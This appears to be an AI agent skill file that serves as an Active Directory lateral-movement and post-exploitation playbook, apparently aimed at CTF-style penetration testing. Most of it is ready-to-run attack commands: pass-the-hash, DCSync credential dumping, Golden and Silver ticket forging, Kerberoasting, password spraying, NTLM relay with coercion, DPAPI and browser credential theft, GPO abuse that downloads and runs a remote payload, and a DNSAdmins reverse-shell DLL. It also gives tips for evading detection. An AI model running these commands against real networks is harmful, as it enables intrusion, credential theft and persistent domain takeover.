---
name: lateral-movement
description: Move laterally and escalate in Active Directory. Use when discussing shell access, Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, Golden/Silver Tickets, Kerberoasting, constrained/unconstrained delegation, RBCD, krbrelayx, PrinterBug/PetitPotam coercion, NTLM relay, DPAPI, LAPS, GPO abuse, DCSync, domain trust attacks, DCShadow, DNSAdmins, or post-exploitation persistence.
user-invocable: false
allowed-tools: Read
---

# Lateral Movement & Post-Exploitation

## Shell access
```bash
evil-winrm -i {IP} -u '{USER}' -p '{PASS}'
evil-winrm -i {IP} -u '{USER}' -H {NT_HASH}
psexec.py {DOMAIN}/{USER}:'{PASS}'@{IP}
psexec.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH}
wmiexec.py {DOMAIN}/{USER}:'{PASS}'@{IP}
wmiexec.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH}
smbexec.py {DOMAIN}/{USER}:'{PASS}'@{IP}       # service-based, noisier
dcomexec.py {DOMAIN}/{USER}:'{PASS}'@{IP}      # DCOM-based
atexec.py {DOMAIN}/{USER}:'{PASS}'@{IP} whoami # scheduled task exec
xfreerdp /v:{IP} /u:{USER} /p:'{PASS}' /cert-ignore /dynamic-resolution
```

## Pass-the-Hash (NTLM)
```bash
evil-winrm -i {IP} -u '{USER}' -H {NT_HASH}
netexec smb {IP} -u '{USER}' -H {NT_HASH} --shares
netexec winrm {IP} -u '{USER}' -H {NT_HASH} -x whoami
psexec.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH}
secretsdump.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -just-dc
```

## Pass-the-Ticket (Kerberos)
```bash
export KRB5CCNAME={ticket.ccache}
psexec.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
wmiexec.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass
evil-winrm -i {DC_FQDN} -r {DOMAIN}
netexec smb {TARGET_FQDN} -k --use-kcache
```

## Overpass-the-Hash (NT hash → TGT)
```bash
getTGT.py {DOMAIN}/{USER} -hashes :{NT_HASH} -dc-ip {IP}
export KRB5CCNAME={USER}.ccache
# Now use Kerberos flows above
```

## DCSync
```bash
secretsdump.py {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
secretsdump.py {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -just-dc
secretsdump.py {DOMAIN}/{USER}@{IP} -k -no-pass -just-dc
netexec smb {IP} -u '{USER}' -p '{PASS}' --ntds
# After DCSync → dump krbtgt hash → Golden Ticket (see below)
```

## Golden Ticket (post-DCSync persistence)
After obtaining the krbtgt NT hash via DCSync, forge TGTs for any user indefinitely.
```bash
# Get domain SID first
lookupsid.py {DOMAIN}/{USER}:'{PASS}'@{IP}   # SID = S-1-5-21-...

# Forge Golden Ticket
ticketer.py -nthash {KRBTGT_NT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} administrator
export KRB5CCNAME=administrator.ccache
psexec.py {DOMAIN}/administrator@{DC_FQDN} -k -no-pass

# With PAC (more realistic, avoids some detections)
ticketer.py -nthash {KRBTGT_NT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -groups 512,513,518,519,520 administrator
```

## Silver Ticket (service-specific, stealthier than Golden)
Forge TGS for a specific service using the service account's NT hash — never touches the DC.
```bash
# Get machine account hash via secretsdump
ticketer.py -nthash {SERVICE_NT_HASH} -domain-sid {DOMAIN_SID} -domain {DOMAIN} -spn cifs/{TARGET_FQDN} administrator
export KRB5CCNAME=administrator.ccache
psexec.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass

# Common SPNs for Silver Tickets:
# cifs/{FQDN}   → SMB/file access
# http/{FQDN}   → IIS/web
# mssql/{FQDN}  → SQL Server
# host/{FQDN}   → remote admin
# wsman/{FQDN}  → WinRM
```

## Kerberoasting
```bash
netexec ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
GetUserSPNs.py {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP} -request
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
# rockyou fails → not the intended path, pivot immediately
```

## AS-REP Roasting
```bash
netexec ldap {IP} -u '{USER}' -p '{PASS}' --asreproast asrep.txt
GetNPUsers.py {DOMAIN}/ -dc-ip {IP} -no-pass -usersfile users.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## Password spraying
```bash
kerbrute passwordspray --dc {IP} -d {DOMAIN} users.txt '{PASSWORD}'   # Kerberos, avoids LDAP logs
netexec smb {IP} -u users.txt -p '{PASS}' --continue-on-success
netexec ldap {IP} -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
# Check lockout policy first: netexec ldap {IP} -u '{USER}' -p '{PASS}' --pass-pol
```

## Constrained delegation (S4U2Self + S4U2Proxy)
```bash
# Check msDS-AllowedToDelegateTo in BloodHound (AllowedToDelegate edge)
getST.py -spn '{SPN}' -impersonate administrator -dc-ip {IP} '{DOMAIN}/{USER}:{PASS}'
export KRB5CCNAME=administrator@{SPN}.ccache
psexec.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass

# With NT hash
getST.py -spn '{SPN}' -impersonate administrator -dc-ip {IP} {DOMAIN}/{USER} -hashes :{NT_HASH}
```

## RBCD (Resource-Based Constrained Delegation)
```bash
# Requires: machine account + write access to msDS-AllowedToActOnBehalfOfOtherIdentity on target
# Step 1: Create attacker machine account (if MachineAccountQuota > 0)
addcomputer.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'ATTACKER$' -computer-pass 'Attacker123!' -dc-ip {IP}

# Step 2: Write RBCD
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object '{TARGET}$' msDS-AllowedToActOnBehalfOfOtherIdentity -v '{ATTACKER_SID}'

# Step 3: Get service ticket impersonating administrator
getST.py -spn cifs/{TARGET_FQDN} -impersonate administrator {DOMAIN}/ATTACKER$ -hashes :{NT_HASH} -dc-ip {IP}
export KRB5CCNAME=administrator@cifs_{TARGET}.ccache
psexec.py {DOMAIN}/administrator@{TARGET_FQDN} -k -no-pass
```

## Unconstrained delegation (full flow — Delegate pattern)
Requires: machine with unconstrained delegation + ability to coerce DC auth
```bash
# 1. Check MachineAccountQuota (default 10)
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M maq

# 2. Create machine account with unconstrained delegation
#    Requires SeEnableDelegationPrivilege OR GenericAll on machine account
addcomputer.py {DOMAIN}/{USER}:'{PASS}' -computer-name 'UNCDEL$' -computer-pass 'Uncdel123!' -dc-ip {IP}
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object 'UNCDEL$' userAccountControl -v 528384

# 3. Add DNS record pointing to attacker machine
python3 dnstool.py -u '{DOMAIN}\{USER}' -p '{PASS}' --action add --record 'UNCDEL' --data '{ATTACKER_IP}' --type A {DC_IP}

# 4. Start krbrelayx listener (captures TGTs from coerced auth)
python3 krbrelayx.py -hashes :{UNCDEL_NT_HASH}

# 5. Coerce DC authentication to UNCDEL machine
python3 printerbug.py {DOMAIN}/{USER}:'{PASS}'@{DC_FQDN} UNCDEL.{DOMAIN}
# Or: python3 PetitPotam.py -u '{USER}' -p '{PASS}' -d {DOMAIN} UNCDEL.{DOMAIN} {DC_IP}

# 6. krbrelayx captures DC TGT → use it
export KRB5CCNAME={DC}$.ccache
secretsdump.py -k -no-pass {DOMAIN}/{DC}$@{DC_FQDN}
```

## NTLMRelay + coercion
```bash
# Relay to LDAP for RBCD
ntlmrelayx.py -t ldaps://{DC_IP} --delegate-access --no-smb-server -smb2support

# Relay to LDAP for shadow creds
ntlmrelayx.py -t ldaps://{DC_IP} --shadow-credentials --shadow-target '{TARGET}$' --no-smb-server

# Coercion methods (to trigger relay)
python3 printerbug.py {DOMAIN}/{USER}:'{PASS}'@{TARGET_FQDN} {ATTACKER_IP}
python3 PetitPotam.py {ATTACKER_IP} {TARGET_IP}                          # no creds needed
python3 PetitPotam.py -u '{USER}' -p '{PASS}' -d {DOMAIN} {ATTACKER_IP} {TARGET_IP}
python3 dfscoerce.py -u '{USER}' -p '{PASS}' -d {DOMAIN} {ATTACKER_IP} {TARGET_IP}
```

## LAPS
```bash
# Read LAPS password (requires ReadLAPSPassword / AllExtendedRights)
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M laps
ldapsearch -x -H ldap://{IP} -D '{USER}@{DOMAIN}' -w '{PASS}' -b 'DC=x,DC=x' '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd sAMAccountName

# Use LAPS password
evil-winrm -i {TARGET_IP} -u administrator -p '{LAPS_PASS}'
netexec smb {TARGET_IP} -u administrator -p '{LAPS_PASS}' --sam
```

## DPAPI credential extraction
```bash
# Remote collection (domain credentials)
donpapi collect --dc-ip {IP} -d {DOMAIN} -u '{USER}' -p '{PASS}'
donpapi collect --dc-ip {IP} -d {DOMAIN} -u '{USER}' -H {NT_HASH}

# Manual decryption
dpapi.py masterkey -file {MK_FILE} -sid {SID} -password '{PASS}'
dpapi.py credential -file {CRED_FILE} -key {MASTERKEY}
dpapi.py blob -file {BLOB_FILE} -key {MASTERKEY}

# Browser credentials (via DonPAPI or remotely)
donpapi --browsers collect --dc-ip {IP} -d {DOMAIN} -u '{USER}' -p '{PASS}'
```

## GPO abuse
```bash
# From Linux (requires GenericAll or WriteDACL on GPO)
python3 pygpoabuse.py {DOMAIN}/{USER}:'{PASS}'@{DC_IP} -gpo-id '{GPO_ID}' -command 'net localgroup administrators {USER} /add' -f
python3 pygpoabuse.py {DOMAIN}/{USER}:'{PASS}'@{DC_IP} -gpo-id '{GPO_ID}' -powershell -command "IEX(New-Object Net.WebClient).DownloadString('http://{ATTACKER}/{PAYLOAD}')" -f

# From Windows shell
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount '{USER}' --GPOName '{GPO}'
.\SharpGPOAbuse.exe --AddComputerTask --TaskName backdoor --Author SYSTEM --Command 'cmd.exe' --Arguments '/c net localgroup administrators {USER} /add' --GPOName '{GPO}'

# Force GPO update on target
netexec smb {TARGET_IP} -u '{USER}' -p '{PASS}' -x 'gpupdate /force'
```

## AD Recycle Bin
```bash
# From Windows (PowerShell)
Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties *
Restore-ADObject -Identity '{GUID}'

# Check for deleted objects with interesting attributes
Get-ADObject -Filter {isDeleted -eq $true -and objectClass -eq 'user'} -IncludeDeletedObjects -Properties sAMAccountName,description,memberOf
```

## Cross-session relay (RemotePotato0)
```bash
netexec smb {IP} -u '{USER}' -p '{PASS}' --sessions    # find active sessions

# From Windows shell (requires admin to target session)
.\RemotePotato0.exe -m 2 -s 1 -x {ATTACKER_IP} -p 9998
# Capture Net-NTLMv2 → relay or crack
```

## Domain trust attacks
```bash
# Enumerate trusts
netexec ldap {IP} -u '{USER}' -p '{PASS}' -M enum_trusts
GetADUsers.py -all -dc-ip {IP} {DOMAIN}/{USER}:'{PASS}'

# Child to parent domain (if SID filtering disabled)
# Get Enterprise Admin SID (S-1-5-21-{PARENT_DOMAIN}-519)
lookupsid.py {PARENT_DOMAIN}/{USER}:'{PASS}'@{PARENT_DC}

# Golden Ticket with SID history to parent domain
ticketer.py -nthash {CHILD_KRBTGT_HASH} -domain-sid {CHILD_DOMAIN_SID} -domain {CHILD_DOMAIN} -extra-sid {PARENT_EA_SID} administrator
export KRB5CCNAME=administrator.ccache
psexec.py {PARENT_DOMAIN}/administrator@{PARENT_DC_FQDN} -k -no-pass

# Cross-forest (if trust allows TGT delegation)
GetUserSPNs.py -target-domain {TRUSTED_DOMAIN} {DOMAIN}/{USER}:'{PASS}' -dc-ip {IP}
```

## DCShadow (red team — stealthy persistence)
Register a rogue DC temporarily to push arbitrary AD changes without touching real DC logs.
```bash
# Requires DA or equivalent + 2 processes
# Process 1: register rogue DC
mimikatz # lsadump::dcshadow /object:"{TARGET_USER}" /attribute:primaryGroupID /value:512
# Process 2: push the change
mimikatz # lsadump::dcshadow /push
# Useful for: adding SID history, modifying group membership, clearing bad pwd count
```

## DNSAdmins → SYSTEM on DC
```bash
# Requires DNSAdmins group membership
msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT=443 -f dll -o evil.dll
python3 -m http.server 80  # or smbserver.py share .

# Inject DLL via DNS
python3 dnstool.py -u '{DOMAIN}\{USER}' -p '{PASS}' --action modify --record '\\{ATTACKER_IP}\share\evil.dll' --type SERVERLEVELPLUGINDLL {DC_IP}
# Or: dnscmd {DC_FQDN} /config /serverlevelplugindll \\{ATTACKER_IP}\share\evil.dll

# Restart DNS service (triggers DLL load as SYSTEM)
netexec smb {DC_IP} -u '{USER}' -p '{PASS}' -x 'sc stop dns && sc start dns'
```

## Pivot checklist after each new account
```
1. netexec winrm {IP} → shell available?
2. netexec smb {IP} --shares → new readable shares?
3. BloodHound → mark account as owned, check outbound control
4. certipy find → new ADCS paths?
5. Group memberships → Backup Operators, Account Operators, DNSAdmins, Remote Management Users
6. LAPS → can we read any computer's local admin password?
7. DPAPI → stored credentials, browser passwords, RDP keys
8. Sessions → netexec smb {IP} --sessions (high-value users logged in?)
9. Scheduled tasks → netexec smb {IP} -M schtask_as_user
10. Services running as domain accounts → targeted kerberoast
```

## Gotchas
- **Always test WinRM first** with new creds — quickest shell
- **rockyou fails on hash** → pivot, not the intended path
- **Constrained delegation** → check msDS-AllowedToDelegateTo in BloodHound (AllowedToDelegate edge)
- **RBCD requires MachineAccountQuota > 0** or existing machine account you own
- **PetitPotam** → works without creds against unpatched DCs
- **Golden Ticket** → krbtgt hash never changes unless you rotate it; valid for 10 years by default
- **Silver Ticket** → not logged at DC, very stealthy; uses service account hash not krbtgt
- **Protected Users** → PTH fails (no NTLM); use Kerberos flows (PTT/Overpass-the-Hash)
- **DCShadow** → changes bypass most SIEM rules; effective for red team persistence
- **DNS restart** for DNSAdmins → logged but DNS outage is brief; clean up after

## Key References
- https://www.ired.team
- https://www.thehacker.recipes
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- https://github.com/dirkjanm/krbrelayx
- https://github.com/n00py/LAPSDumper
- https://github.com/login-securite/DonPAPI
- https://0xdf.gitlab.io
